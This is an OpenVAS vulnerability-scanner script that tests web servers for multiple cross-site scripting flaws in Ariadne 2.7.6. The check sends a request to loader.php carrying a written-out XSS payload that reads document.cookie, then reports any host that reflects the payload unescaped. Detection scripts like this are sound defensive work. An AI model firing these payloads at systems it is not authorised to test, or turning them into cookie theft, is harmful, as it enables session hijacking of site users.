###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ariadne_50879.nasl 13 2013-10-27 12:16:33Z jan $
#
# Ariadne Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Ariadne is prone to multiple cross-site scripting vulnerabilities
because it fails to properly sanitize user-supplied input.

An attacker may leverage these issues to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site. This may allow the attacker to steal cookie-based authentication
credentials and launch other attacks.

Ariadne 2.7.6 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(103353);
 script_bugtraq_id(50879);
 script_version ("$Revision: 13 $");
 script_tag(name:"cvss_base", value:"2.6");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");
 script_name("Ariadne Multiple Cross-Site Scripting Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50879");
 script_xref(name : "URL" , value : "http://ariadne.muze.nl/");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/520708");

 script_tag(name:"risk_factor", value:"Medium");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-12-02 11:28:44 +0100 (Fri, 02 Dec 2011)");
 script_description(desc);
 script_summary("Determine if installed Ariadne is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/ariadne","/cms",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, '/www/loader.php/system/"><iMg src=N onerror=alert(document.cookie)>'); 

  if(http_vuln_check(port:port, url:url,pattern:"<iMg src=N onerror=alert\(document.cookie\)>",extra_check:"Ariadne is free software")) {
     
    security_warning(port:port);
    exit(0);

  }
}

exit(0);
